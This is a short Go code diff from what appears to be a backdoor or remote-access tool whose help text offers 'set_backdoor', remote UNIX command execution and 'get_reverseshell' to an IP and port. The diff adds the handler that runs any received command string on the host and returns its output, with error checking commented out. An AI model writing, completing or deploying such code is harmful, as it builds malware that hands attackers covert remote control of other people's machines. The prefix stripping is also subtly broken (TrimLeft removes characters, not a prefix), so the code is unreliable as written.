@@ -2,6 +2,7 @@ package main
 
 import (
 	"os"
+	"os/exec"
 	"fmt"
 	"net"
 	"bufio"
@@ -75,11 +76,17 @@ func Decryption(message string, local_priv_key rsa.PrivateKey) string {
 func InterpretCommand(command string) string {
 	command = strings.Trim(command, "\n")
 	fields := split(command, ' ')
-	fmt.Println(fields[0])
 	if len(fields) == 1 {
 		return "Commands you can use are : help, set_backdoor <IP:PORT>, command <UNIX_COMMAND>, get_reverseshell <IP:PORT>"
 	} else if fields[0] == "command" {
-		return "command"
+		payload := strings.TrimLeft(command, "command ")
+		fmt.Println(payload)
+		output_byte, _ := exec.Command(payload).Output()
+		//if err != nil {
+		//	return "Request failed"
+		//}
+		output := fmt.Sprintf("%s", output_byte)
+		return output
 	} else {
 		return "fuck"
 	}
